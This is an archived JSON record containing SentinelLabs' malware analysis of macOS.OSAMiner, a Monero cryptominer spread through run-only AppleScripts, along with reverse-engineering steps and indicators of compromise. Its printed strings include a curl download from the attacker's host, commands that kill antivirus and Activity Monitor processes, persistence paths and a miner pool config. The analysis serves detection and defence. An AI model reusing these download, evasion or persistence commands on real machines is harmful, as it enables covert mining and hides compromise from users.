{
    "id": "bbbfaebb-001f-4a97-82fd-693e8d300c90",
    "created_at": "2023-01-12T15:09:15.987265Z",
    "updated_at": "2025-03-27T02:05:52.734801Z",
    "deleted_at": null,
    "sha1_hash": "f7e075f876a1a64ac5a07d82642c934c345f4cba",
    "title": "2021-01-11 - FADE DEAD - Adventures in Reversing Malicious Run-Only AppleScripts",
    "authors": "",
    "file_creation_date": "2022-05-28T19:56:02Z",
    "file_modification_date": "2022-05-28T19:56:02Z",
    "file_size": 8602688,
    "plain_text": "# FADE DEAD | Adventures in Reversing Malicious Run- Only AppleScripts\n\n**[labs.sentinelone.com/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/](https://labs.sentinelone.com/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/)**\n\nPhil Stokes\n\n## Executive Summary\n\nmacOS.OSAMiner is a cryptominer campaign that has resisted full researcher analysis\nfor at least five years due to its use of multiple run-only AppleScripts.\nmacOS.OSAMiner has evolved to use a complex architecture, embedding one run-only\nAppleScript within another and retrieving further stages embedded in the source code\nof public-facing web pages.\nCombining a public AppleScript disassembler repo with our own AEVT decompiler tool\nallowed us to statically reverse run-only AppleScripts for the first time and reveal\npreviously unknown details about the campaign and the malware’s architecture.\n[We have released our AEVT decompiler tool as open source to aid other researchers](https://github.com/SentineLabs/aevt_decompile)\nin the analysis of malicious run-only AppleScripts.\n\n## Background\n\n[Back in 2018, reports surfaced on Chinese security sites[1,](https://www.anquanke.com/post/id/160496) [2] about a Monero mining trojan](https://translate.google.com/translate?hl=en&sl=zh-CN&u=https://www.codetd.com/article/2819752)\ninfecting macOS users. Symptoms included higher than usual CPU, system freeze and\nproblems trying to open the system Activity Monitor.app. Investigations at the time concluded\n\n\n-----\n\nthat macOS.OSAMiner, as we have dubbed it, had likely been circulating since 2015,\ndistributed in popular cracked games and software such as League of Legends and MS\nOffice.\n\nAlthough some IoCs were retrieved from the wild and from dynamic execution by\nresearchers, the fact that the malware authors used run-only AppleScripts prevented much\n[further analysis. Indeed, 360 MeshFire Team reported that the malicious applications:](https://www.anquanke.com/member/121034)\n\nA similar conclusion was reached by another Chinese security researcher trying to\n[dynamically analyse a different sample of macOS.OSAMiner in 2020 [3], noting that “No](https://translate.google.com/translate?hl=&sl=auto&tl=en&u=https%3A%2F%2Fwww.tr0y.wang%2F2020%2F03%2F05%2FMacOS%E7%9A%84ssl4.plist%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%95%2F)\nreverse method has been found…so the investigation ends here”\n\nIn late 2020, we discovered that the malware authors, presumably building on their earlier\nsuccess in evading full analysis, had continued to develop and evolve their techniques.\nRecent versions of macOS.OSAMiner add greater complexity by embedding one run-only\nAppleScript inside another, further complicating the already difficult process of analysis.\n\n\n-----\n\nHowever, with the help of a little-known applescript-disassembler project and a decompiler\ntool we developed here at SentinelLabs, we have been able to reverse these samples and\ncan now reveal for the first time their internal logic along with further IoCs used in the\ncampaign.\n\nWe believe that the method we used here is generalizable to other run-only AppleScripts and\nwe hope this research will be helpful to others in the security community when dealing with\nmalware using the run-only AppleScript format.\n\n## A Malicious Run-Only AppleScript (or Two)\n\nWhile malware hunting on VirusTotal, we came across the following property list:\n\ncom.apple.FY9.plist\n\n9ad23b781a22085588dd32f5c0a1d7c5d2f6585b14f1369fd1ab056cb97b0702\n\nAs noted above, we have seen this before in 2018 and earlier in 2020. The older persistence\nagents are almost identical save for the labels and names of the targeted executable. In the\n2018 version, the malware tries to disguise itself as belonging to both “apple.Google” and\n“apple.Yahoo”:\n\n\n-----\n\nThe tell-tale LaunchAgent program argument is odd for its redundant use of `osascript to`\ncall itself via a `do shell script command (Lines 11-13). However, pivoting on the`\nprogram argument, `com.apple.4V.plist, led us to this newer sample for the executable:`\n\ndf550039acad9e637c7c3ec2a629abf8b3f35faca18e58d447f490cf23f114e8\n\nAs with earlier versions of this malware, the executable also uses a `.plist extension and`\nruns from the user’s Library LaunchAgents folder and, again, `com.apple.4V.plist is not a`\nproperty list file but a run-only AppleScript:\n\nWe can quickly confirm that this is a run-only AppleScript by attempting to decompile with\n\n`osadecompile, which returns the error:` `errOSASourceNotAvailable` [(-1756)](https://www.osstatus.com/search/results?platform=all&framework=all&search=-1756)\n\n## Strings May Tell You Something, But Not Much\n\nThe best starting point with run-only scripts is to dump the strings and the hex. For strings,\n[we generally find the floss tool to be superior to the macOS version of the](https://github.com/fireeye/flare-floss) `strings`\ncommand line tool. This sample proves to be a case in point, because what `strings won’t`\nshow you but `floss will is all the UTF-16 encoded hex that are buried in this file:`\n\n\n-----\n\nAt this point we should look at the hexdump.\n```\n% hexdump -C\ndf550039acad9e637c7c3ec2a629abf8b3f35faca18e58d447f490cf23f114e8\n\n```\nNotice, in particular the magic header: `FasdUAS, which is` `46 61 73 64 55 41 53 20 in`\nhex. Compare that to the embedded hex in the previous screenshot, or further down in our\nhexdump:\n\n\n-----\n\nThis shows that our run-only script has another run-only script embedded within it, encoded\nin hexadecimal, a trick that was not seen in the earlier variants of this malware.\n\nOne of the nice things about AppleScript is not only does it have a magic at the beginning of\nan AppleScript file it also has one to mark the end of the script:\n\nAnd equally, we can find the end of the embedded script within the parent script by looking\nfor the hex `fa de de ad or` `FADE DEAD .`\n\n\n-----\n\nWe can now pull out all the code of the embedded script and dump that into a separate file.\n\nWe can use `file and` `osadecompile to confirm that we do indeed now have a second`\nvalid, run-only AppleScript:\n\nLet’s now call `floss on the extracted script and see what we have. You will see the output`\ncontains a lot of Apple Event (AEVT) codes and, at the end, a few UTF-16 encoded strings\nthat were not revealed when we dumped the strings from the parent script:\n\n\n-----\n\nAlthough the first image above does not quite show all the AEVT codes in the output, it’s\neasy to be distracted by the UTF-16 strings at the end, which immediately suggest\nsomething interesting: it looks like this script uses a `grep search to find a particular`\nprocess and kill it. It’s also clear the script is targeting both System Events.app and Activity\nMonitor. And there’s a tantalizing “Installe” string there, too!\n\n\n-----\n\nThe really interesting content of the script lies in the disassembly and the AEVT codes, but\nit’s difficult to see that from extracting the strings and a hexdump for two reasons:\n\nWe don’t have any understanding of the structure or logic of the script\nWe don’t have human-readable translations of the AEVT codes.\n\n[We will solve the first problem by using Jinmo’s applescript-disassembler and the second](https://github.com/Jinmo/applescript-disassembler)\n[problem by using our own aevt_decompile tool.](https://github.com/SentineLabs/aevt_decompile)\n\n## Disassembling Run-only AppleScripts\n\nWe have two targets for disassembly, the parent script and the embedded script. Let’s start\nwith the parent.\n\nOnce you’ve installed and built the applescript-disassembler project, simply call the target\nscript against the `disassembly.py script and output to a text file for analysis:`\n```\n% ./disassembly.py\ndf550039acad9e637c7c3ec2a629abf8b3f35faca18e58d447f490cf23f114e8 >\nparent.txt\n\n```\nThe beginning of the `parent.txt file should look something like this:`\n\nThe first thing to note is that the content is divided into functions, separated by the lines\n\n\n-----\n\n```\n  data offset \nFunction name :\nFunction arguments:\n\n```\n[These correspond to AppleScript handlers. In this compiled script, there are three named](https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/conceptual/ASLR_about_handlers.html)\nhandlers and one unnamed handler, which corresponds to the script’s “main” handler (i.e.,\nthe main function called on execution).\n```\n=== data offset 2 ===\nFunction name : e\nFunction arguments: ['_s']\n=== data offset 3 ===\nFunction name : d\nFunction arguments: ['_s']\n=== data offset 4 ===\nFunction name : r_t\nFunction arguments: ['t_t', 's_s', 'r_s']\n=== data offset 5 ===\nFunction name : <Value type=object value=<Value type=event_identifier value='AEVT''oapp'-'null'-'x00x00x80x00'-'****'-'x00x00x90x00'>>\nFunction arguments: <empty or unknown>\n\n```\nThe most interesting function for us at the moment is the second function, ‘d’, which we will\nrename as the ‘decode’ function. This function is called multiple times later in the code and\npassed an obfuscated string of hex characters. Reversing this function will allow us to see\nthe obfuscated strings in plain text. Even better, since the same function is used in all\nsamples we’ve come across since 2018, it’ll also allow us to decode the strings right across\nthe campaign and observe how it has changed.\n\nThe disassembler conveniently comments where this function is called. To find the first call,\nsearch for a PositionalMessageSend (i.e., handler call) with the name ‘d’.\n\nFor example, the following hex string at offset 000d4 is passed to the decode function at\n**000d8:**\n```\n'x00xd4x00xd6x00xcdx00xd2x00xd8x00xcax00x84x00x8bx00x89x00xc6x00x8bx00x84x00x8b'\n\n```\nNote that in the decode handler, there is a loop which iterates over each hexadecimal byte\ncode and then subtracts `x64 from it.`\n\n\n-----\n\nIt then returns that number as an ASCII code, concatenating each result to produce a UTF-8\nstring (note the input is padded with `x00, indicating a UTF-16 string, but the function`\nignores any values that are not greater than zero). The first line of input hex is returned from\nthe decode handler as the following UTF-8 string:\n\n```\nprintf '%b' '\n\n```\n\nBased on this, it’s easy enough to implement our own decode function to deobfuscate all the\n[obfuscated strings in the run-only scripts. We add this logic to our aevt_decompile tool as](https://github.com/SentineLabs/aevt_decompile)\ndiscussed further below.\n\nThe handler ‘e’ is never called in the malware code, but inspection reveals it to be the\nreverse of the ‘d’ function. In other words, the function is used to encode plain UTF-8 strings\nto produce the obfuscated hex and is presumably used by the authors when building their\nmalware.\n\nThe function ‘r_t’, which takes three parameters, is only called once. This function takes a\ntarget, a source and a ‘delimiter’.\n\n\n-----\n\nOnce we substitute the constant hex values shown in the disassembler for the Apple Event\ncodes (discussed below), we will see that its purpose is to find a target substring by\nseparating the source string into components divided by the delimiter. From our analysis\nbelow, it appears that this handler is used to format the embedded AppleScript before writing\nit out to file.\n\nThe fourth, nameless, function is in fact where all the executable code is called from in an\nAppleScript (think of it like a ‘main’ function in other languages). Again, we’ll discuss this\nfurther below when we move on to decompiling the Apple Event codes and annotating the\noutput of the disassembler.\n\n## Disassembling the Embedded AppleScript\n```\n% ./disassembly.py\nf145fce4089360f1bc9f9fb7f95a8f202d5b840eac9baab9e72d8f4596772de9 > em.txt\n\n```\nThe embedded run-only AppleScript also contains four functions, ‘e’, ‘d’, ‘kPro’ and the\nnameless ‘main’ function where the script’s executable code is called. The first two are\nduplicates of the encode and decode functions in the parent script.\n\nThe ‘kPro’ is obviously a ‘killProcess’ function. We can determine this directly from the\ndisassembler as much of the functionality is revealed as hardcoded strings:\n\n\n-----\n\nWe will automate extraction of these strings in our decompiler below, but for now note that\nthe code above contains the following embedded strings:\n```\nps ax | grep\ngrep -v grep | awk ‘{print $1 }’\nkill -9\n\n```\nThe function is passed the name of a process as a string, which is concatenated to produce\nthe shell command:\n\n```\nps ax | grep <name> | grep -v grep | awk ‘{print $1}’\n\n```\n\nThis command is then executed via the AppleScript `do shell script command. If the`\ncommand returns a PID for the process name, a further `do shell script command is`\nexecuted to kill the PID.\n\nWe can see that the ‘killProcess’ function is called twice in the code. On the first call, it is\npassed a string concatenated from “Activity Monitor” and “.app”, both of which are hardcoded\nin the source:\n\n\n-----\n\nThis call occurs only if “Activity Monitor” is returned in the list of System Events’ currently\nrunning processes.\n\nThe second call to ‘killProcess’ requires decoding a number of the script’s obfuscated\nhexadecimal strings by passing those through the ‘d’ or decode function as we did before.\n\n\n-----\n\nHere we show some of the output of the `disassembler.py script after running it through`\nour decompiler tool, discussed in the next section:\n```\nps ax | grep -E '360|Keeper|MacMgr|Lemon|Malware|Avast|Avira|CleanMyMac' |\ngrep -v grep | awk '{print $1}'\n\n## Building a Decompiler on Top of the Disassembler\n\n```\nWithout the AEVT codes and other decompiling, the output of the disassembler is obscure at\nbest.\n\n\n-----\n\nRunning our decompile tool on the output from the disassembler, however, makes things\nmuch clearer. Not only do we get each AEVT code’s command name and description in\nhuman readable form, our tool also automatically extracts and decodes the malware’s\nobfuscated hex strings.\n\nEmbedded strings, as well as hardcoded strings and number formats are also translated.\n\nFrom the disassembler output we get:\n\nBut after running it through the decompiler, we get a much more informative output for these\nlines:\n\n\n-----\n\nSimilarly, “Tell” blocks in AppleScript are much easier to understand after running the\ndecompiler. From the disassembly alone, it’s difficult to interpret the purpose of the following\ncode between offset 00007 and 00018, for example:\n\nThe decompiler makes it clear that the block targets System Events and returns the disk\ncapacity of “/”, the startup drive.\n\n\n-----\n\nOur tool attempts to return the human-readable code for an AEVT from all available sources.\nThat can mean multiple interpretations for a single line.\n\nYears of experience with AppleScript has taught us that this kind of verbosity is vital to make\nsense of complex scripts, where the meaning of AEVT codes can change depending on the\ntarget of the block they appear in. For those less familiar with the vagaries of AppleScript, a\nlittle explanation here may be in order.\n\n## Interlude: A Quick Guide to AEVT Codes\n\n[According to Apple’s legacy documentation (I maintain a PDF repository here), Apple Event](https://applescriptlibrary.wordpress.com/)\ncodes “are defined primarily in the header files AppleEvents.h and AERegistry.h in the AE\n_framework”. However, the word “primarily” is an important, and arguably misleading, qualifier_\nas there are many other places where the codes can be defined, depending on exactly what\nthe script targets.\n\n\n-----\n\nMost AppleScripts will likely make use of the `StandardAdditions.osax, which defines a`\nwhole range of codes that add essential functionality to the base AppleScript language. In\naddition, malware scripts are likely to also target either or both of System Events and the\nTerminal, both of which have their own definitions for Apple Event codes. Indeed, any\napplication that is “scriptable” can define its own Apple Event codes. These definitions are\nnowadays located in an XML file with the extension `.sdef inside each application’s own`\nbundle Resources folder.\n\nBecause of this architecture, you can only retrieve the codes for an AppleScript if you have\nthe targeted applications on your system. Fortunately, in the case of malware, it is highly\nlikely that the malware will only target system applications that can be found on every Mac,\nsuch as System Events and the Terminal, both because of their power to manipulate the\nsystem and because of their universality – an AppleScript that targets an application that is\nnot on the victim’s system will fail to execute fully or at all, and will thus have limited utility, at\nleast for commodity malware.\n\nThe paths we need for most Apple Event codes then can be found in the following locations:\n\n**AEFramework:**\nWe need the source for the AEFramework headers, and that requires installation of the\nXcode Command Line tools. These should be found within the\n```\n/Library/Developer/CommandLineTools/SDK s folder. For example on Catalina:\n/Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk/System/Library/Frameworks/Cor\n\n```\nFor Big Sur,\n```\n/Library/Developer/CommandLineTools/SDKs/MacOSX11.0.sdk/System/Library/Frameworks/Core\n\n```\nAlternatively, you may find the path to these from the Terminal, via\n\n```\n% xcode-select -p\n\n```\n\nThe output of that command can then be extended with the following path that should take\nyou to the Headers directory:\n```\n/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/System/Library/Frameworks/CoreSer\n\n```\n\n-----\n\n**AppleScriptKit:**\n```\n/System/Library/Frameworks/AppleScriptKit.framework/Versions/A/Resources/AppleScriptKi\n\n```\n**Standard Additions OSAX:**\n```\n/System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/Resources/StandardA\n\n```\n**System Events.app:**\n```\n/System/Library/CoreServices/System Events.app/Contents/Resources/SystemEvents.sdef\n\n```\n**Terminal.app:**\n```\n/System/Applications/Utilities/Terminal.app/Contents/Resources/Terminal.sdef\n\n```\nThere are, of course, many more `.sdef files on any given system – as many as there are`\nscriptable applications on the current OS installation. The Script Editor’s Dictionary viewer\nlists all scriptable applications on a system:\n\n\n-----\n\nHowever, few of those will be targeted by malware. Even so, since the scripting definition file\nappears in a predictable location within each application bundle, our decompiler attempts to\nsuggest further SDEFs for other applications targeted in the script if they exist on the\nanalysis machine. Which code is the correct one given the context of the rest of the script is\nup to the analyst to interpret. The aim of our decompiler is to make this fairly easy to discern.\n\n## Understanding the macOS.OSAMiner Campaign\n\nWith these tools to hand, our workflow will be as follows:\n```\n% disassembler.py target.scpt > target.txt\n% aevt_decompile target.txt\n -> ~/Desktop/target.out\n\n```\nThe aevt_decompile program will by default output to `~/Desktop/<filename>.out (e.g.,`\ntarget.out), though this can be changed in the code. The `.out file can be opened or read in`\nVi, BBEdit or whatever happens to be your preferred text editor.\n\nRunning our tools on a number of samples from 2018 to 2020 now reveals more clearly how\nthe macos.OSAMiner campaign works. The parent script first checks the disk capacity of the\nvictim’s machine via System Events and exits if there is not enough free space.\n\n\n-----\n\nNext, it writes out the embedded AppleScript to `~/Library/k.plist via a` `do shell`\n```\nscript command, and then executes the embedded script with osascript, again shelling\n\n```\nout via `do shell script . As we shall see, the primary function of this embedded script is`\nto take on evasion and anti-analysis duties.\n\nAfter writing out the embedded script, the parent script continues to execute, setting up a\npersistence agent and downloading the first stage of the miner by retrieving a URL\nembedded in a public web page.\n\nIn our particular sample, the obfuscated, hardcoded URL is\n\n```\nhxxp://www[.]budaybu10000[.]com:8080\n\n```\n\nHowever, this URL currently does not resolve, which suggests either that the malware\ncampaign for this particular URL has not been activated yet or for some reason has gone\noffline. Fortunately, we can use our disassembler and decompiler on other samples to find a\nstill live URL and see what it serves. In this case, we can find the following URL\n\n```\nhxxps://www[.]emoneyspace[.]com/wodaywo\n\n```\n\nhaving the same function in an older sample\n(ab4596d3f8347d447051eb4e4075e04c37ce161514b4ce3fae91010aac7ae97f) and still live.\nThe URL takes us to the following public web page:\n\n\n-----\n\nThe source code of the webpage is parsed by the malware to retrieve an embedded URL\nsurrounded by the text delimiters `-=-=-= . Curiously, the code for extracting the URL is`\nduplicated inline rather than being passed off to the ‘r_t’ function at data offset 4.\n\nThe extracted URL is passed to the `curl utility for downloading a remote file. Despite the`\n```\n.png extension, it is of course another run-only AppleScript, which is now written out to\n~/Library/11.png on the infected device and executed at offset 00387.\n\n```\nThe malware now has four components running (path names can vary across samples):\n\na persistence agent for the parent script at\n\n```\n~/Library/LaunchAgents/com apple FY9 plist\n\n```\n\n-----\n\nthe parent script executing from `~/Library/LaunchAgents/com.apple.4V.plist`\nthe embedded evasion/anti-analysis AppleScript running from `~/Library/k.plist`\nthe miner setup script running from `~/Library/11.png`\n\nBefore we turn to the latter two, note that the parent script has not finished its business yet. It\ncontinues to execute various tasks, including gathering the device serial number, restarting\nthe [launchctl job and killing the Terminal application. This last action is one of the few that](https://ss64.com/osx/launchctl.html)\nare not executed through `do shell script commands; instead, the script targets the`\nTerminal directly through its own `do script AppleScript command.`\n\nMeanwhile, the embedded AppleScript looks for the Activity Monitor process among System\nEvents’ process list. If found, it passes the application’s name to its ‘kPro’ or ‘killProcess’\nhandler to prevent the user inspecting resource usage.\n\nEven more interesting, the embedded script also functions to perform evasion tasks from\ncertain consumer-level monitoring and clean up tools. It searches both for PIDs among\nrunning processes and it parses the operating system’s `install.log for apps matching its`\nhardcoded list, killing any that it finds along the way.\n\n\n-----\n\n## Downloading and Configuring the Miner Component\n\nFinally, running our tools on the miner setup script reveals that it functions as a downloader\nand config for what appears to be an instance of the open-source XMR-STAK-RX – Free\nMonero RandomX Miner software.\n\nThe setup script includes pool address, password and other configuration information but no\nwallet address.\n\n\n-----\n\nThis miner script also checks to ensure there is enough disk space, but this time using the\nUnix utility `df rather than the System Events application.`\n\n[The miner setup script also uses the built-in caffeinate tool to prevent the Mac sleeping and](https://ss64.com/osx/caffeinate.html)\n[also does some evasion checks. It parses the output of the built-in system_profiler tool to](https://ss64.com/osx/system_profiler.html)\ncheck whether the device has 4 cores, a rudimentary way of trying to ensure it is not running\nin a virtual machine environment.\n\n\n-----\n\nNext, a folder is created in `~/Library/Caches/ with the name “com.apple.” and two`\nuppercase letters, which are hardcoded in the script. In this sample, those letters are ‘CM’,\nso the folder to be written is `~/Library/Caches/com.apple.CM/ .`\n\n[Interestingly, we can see from reversing an older sample with our tools that previously the](https://www.virustotal.com/gui/file/f89205a8091584e1215cf33854ad764939008004a688b7e530b085e3230effce/detection)\nmalware wrote its components to the `~/Library/Safari/ folder, but as that is now`\n[prohibited by TCC restrictions since Mojave 10.14, the malware authors have clearly had to](https://www.sentinelone.com/blog/mojaves-security-hardening-user-protections-bypassed/)\nadapt.\n\nVarious files are written to this folder:\n\nconfig.txt\ncpu.txt\npools.txt\nssl.zip\n\nThe last is a compressed folder which contains a file variously called ssl.plist, ssl3.plist,\nssl4.plist and so on. In keeping with the malware’s tactic of using misleading file extensions,\nthis is of course not a plist but in fact a [Mach-O executable. The executable appears to be an](https://www.sentinelone.com/blog/how-to-reverse-macos-malware-part-two/)\ninstance of the XMR-STAK miner and is downloaded from a hardcoded and obfuscated URL:\n\n\n-----\n\n`97febb1aa15ad7b1c321f056f7164526eb698297e0fea0c23bd127498ba3e9bb` [ssl4.plist](https://www.virustotal.com/gui/file/97febb1aa15ad7b1c321f056f7164526eb698297e0fea0c23bd127498ba3e9bb/content/strings)\n\n## Conclusion\n\nRun-only AppleScripts are surprisingly rare in the macOS malware world, but both the\nlongevity of and the lack of attention to the macOS.OSAMiner campaign, which has likely\nbeen running for at least 5 years, shows exactly how powerful run-only AppleScripts can be\nfor evasion and anti-analysis. In this case, we have not seen the actor use any of the more\n[powerful features of AppleScript that we’ve discussed elsewhere [4,5], but that is an attack](https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/)\nvector that remains wide open and which many defensive tools are not equipped to handle.\nIn the event that other threat actors begin picking up on the utility of leveraging run-only\nAppleScripts, we hope this research and the tools discussed above will prove to be of use to\nanalysts.\n\n## Hashes and IoCs\n\n\n-----\n\nSHA1: d760c99dec3efd98e3166881d327aa2f4a8735ef\nSHA256: 35a83f2467d914d113f5430cdbede54ac96a212ed2b893ee9908e6b05c12b6f6\n_Office4mac.app.zip (Trojanized Application bundle, 2018 version)_\n\nSHA1: 13382e8cb8edb9bfea40d2370fc97d0cbdbf61e7\nSHA256: 5619d101a7e554c4771935eb5d992b1a686d4f80a2740e8a8bb05b03a0d6dc2b\n_Install-LOL.app.zip (Trojanized Application bundle, 2018 version)_\n\nSHA1: 93b2653a4259d9c04e5b780762dc4abc40c49d35\nSHA256: df550039acad9e637c7c3ec2a629abf8b3f35faca18e58d447f490cf23f114e8\n_com.apple.4V.plist (AppleScript, parent script dropped by trojanized application to_\n```\n~/Library/LaunchAgents/ folder)\n\n```\nSHA1: f2bdec618768e2deb5c3232f327fb3d6165ac84c\nSHA256: 9ad23b781a22085588dd32f5c0a1d7c5d2f6585b14f1369fd1ab056cb97b0702\n_com.apple.FY9.plist (Persistence launch agent for com.apple.4V.plist)_\n\nSHA1: f3c9ecc8484ce602493652a923e9afdbb5b10584\nSHA256: b954af3ee83e5dd5b8c45268798f1f9f4b82ecb06f0b95bf8fb985f225c2b6af\n_main.scpt (AppleScript, parent script contained in trojanized application, 2018 version)_\n\nSHA1: 562cb5103859e6389882088575995dc9722b781a\nSHA256: f145fce4089360f1bc9f9fb7f95a8f202d5b840eac9baab9e72d8f4596772de9\n_k.plist (AppleScript, written to_ `~/Library/k.plist for evasion and anti-analysis;)`\n\nSHA1: f3d83291008736e1f8a2d52e064e2decb2c893ba\nSHA256: ab4596d3f8347d447051eb4e4075e04c37ce161514b4ce3fae91010aac7ae97f\n_001.plist (AppleScript, earlier version of k.plist, written to the LaunchAgents folder as_\n“com.apple.Yahoo.plist”)\n\nSHA1: 13d65cb49538614f94b587db494b01273a73a491\nSHA256: 24cd2f6c4ad6411ff4cbb329c07dc21d699a7fb394147c8adf263873548f2dfd\n_wodaywo.png_\n(AppleScript, written to `~/Library/11.png, miner config / downloader script)`\n\nSHA1: 1a662b22b04bd3f421afb22030283d8bdd91434a\nSHA256: f89205a8091584e1215cf33854ad764939008004a688b7e530b085e3230effce\n_ondayon.png_\n(AppleScript, earlier version of the miner config / downloader script)\n\nSHA1: cfb1a0cd345bb2cbd65ed1e6602140829382a9b4\nSHA256: 97febb1aa15ad7b1c321f056f7164526eb698297e0fea0c23bd127498ba3e9bb\n_ssl4.plist (Mach-O, XMR-Stak miner, written to_\n```\n~/Library/Caches/com.apple.XX/ssl4.plist, where “XX” is any two uppercase letters.\n\n```\nOlder samples write to `~/Library/Safari/ ).`\n\n\n-----\n\nSHA1: 0756f251bc78bfe298a59db97a2b37aa3f2d3f96\nSHA256: 1ecbc4472bf90c657d4b27bcf3ca5f2ec2b43065282a8d57c9b86bdf213f77ed\n_ssl3.plist (earlier variant of above)_\n\n**Observed Parent Script Names**\ncom.apple.4V.plist\ncom.apple.UV.plist\ncom.apple.00.plist\n\n**Persistence Agent Labels**\ncom.apple.FY9.plist\ncom.apple.HYQ.plist\ncom.apple.2KR.plist\n\n**Observed URLs**\nhxxps://www[.]emoneyspace[.]com/wodaywo\nhxxp://www[.]wodaywo65465182[.]com\nhxxp://wodaywo.com[:]8080\nhxxp://www[.]budaybu10000[.]com:8080\n\n**Significant Parent Script Strings:**\n-o ~/Library/11.png\n;killall Terminal\n;launchctl start com.apple.\n/usr/sbin/system_profiler SPHardwareDataType | awk\n~/Library/LaunchAgents/com.apple.\nlaunchctl stop com.apple.\nosascript ~/Library/11.png > /dev/null 2> /dev/null &\nosascript ~/Library/k.plist > /dev/null 2> /dev/null &\nping -c 1 www.apple.com\nping -c 1 wwww.yahoo.com\nrm ~/Library/11.png\nrm ~/Library/k.plist\n-=-=-=\ntime=\n\n**Significant Evasion Script Strings:**\n{print $1}\n/var/log/install.log\n360\nActivity Monitor\nAvast\nAvira\nCleanMyMac\n\n\n-----\n\nInstallation Log\nInstaller\nKeeper\nkill -9\nLemon\nMacMgr\nMalware\nps ax | grep -E\n\n**Significant Miner Setup Script Strings:**\n```\n\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" :\n3,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" :\n\"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" :\nfalse,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" :\n\"\",\"prefer_ipv4\" : true,\n\n```\n<pre.”cpu_threads_conf” :[  { “low_power_mode” : false, “no_prefetch” : true, “asm” : “auto”,\n“affine_to_cpu” : 0 },  { “low_power_mode” : false, “no_prefetch” : true, “asm” : “auto”,\n“affine_to_cpu” : 1 },  { “low_power_mode” : false, “no_prefetch” : true, “asm” : “auto”,\n“affine_to_cpu” : 2 },],\n```\n\"cpu_threads_conf\" :[  { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" :\n\"auto\", \"affine_to_cpu\" : 0 },],\n\"pool_list\" :[{\"pool_address\" : \"wodaywo.com:8888\", \"wallet_address\" : \"\", \"rig_id\" :\n\"\", \"pool_password\" : \"x\", \"use_nicehash\" : true, \"use_tls\" : false,\n\"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\n\n```\n[ -e\n] && echo true || echo false\n/config.txt\n/cpu.txt\n/pools.txt\n/ssl.zip\n/ssl4.plist\n/usr/bin/ditto -xk\n/usr/sbin/system_profiler SPHardwareDataType | awk\n&> /dev/null & exit;\n~/library/Caches/com.apple.\nCaches/com.apple.\ncaffeinate -d &> /dev/null & echo $!\ncaffeinate -i &> /dev/null & echo $!\ncaffeinate -m &> /dev/null & echo $!\ncaffeinate -s &> /dev/null & echo $!\ncurl -L http://wodaywo.com:8080/ssl.zip -o\n\n\n-----\n\ndf -g / | grep / | grep -v grep | awk\nmkdir ~/library/Caches\nmkdir ~/library/Caches/com.apple.\nores: 4\npgrep ssl4.plist\nsystem_profiler SPHardwareDataType\n\n## References\n\n1. [https://www.anquanke.com/post/id/160496](https://www.anquanke.com/post/id/160496)\n\n2. [https://www.codetd.com/article/2819752](https://www.codetd.com/article/2819752)\n\n3. https%3A%2F%2Fwww.tr0y.wang%2F2020%2F03%2F05%2FMacOS的ssl4.plist挖矿病毒\n排查记录%2F\n\n4. https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-buildingbinaries/\n\n5. https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attackingmacos/\n\n## Resources\n\n[https://github.com/SentineLabs/aevt_decompile](https://github.com/SentineLabs/aevt_decompile)\n[https://github.com/Jinmo/applescript-disassembler](https://github.com/Jinmo/applescript-disassembler)\n[https://applescriptlibrary.wordpress.com/](https://applescriptlibrary.wordpress.com/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-11 - FADE DEAD - Adventures in Reversing Malicious Run-Only AppleScripts.pdf"
    ],
    "report_names": [
        "2021-01-11 - FADE DEAD - Adventures in Reversing Malicious Run-Only AppleScripts.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536155,
    "ts_updated_at": 1743041152,
    "ts_creation_date": 1653767762,
    "ts_modification_date": 1653767762,
    "files": {
        "pdf": "https://archive.orkl.eu/f7e075f876a1a64ac5a07d82642c934c345f4cba.pdf",
        "text": "https://archive.orkl.eu/f7e075f876a1a64ac5a07d82642c934c345f4cba.txt",
        "img": "https://archive.orkl.eu/f7e075f876a1a64ac5a07d82642c934c345f4cba.jpg"
    }
}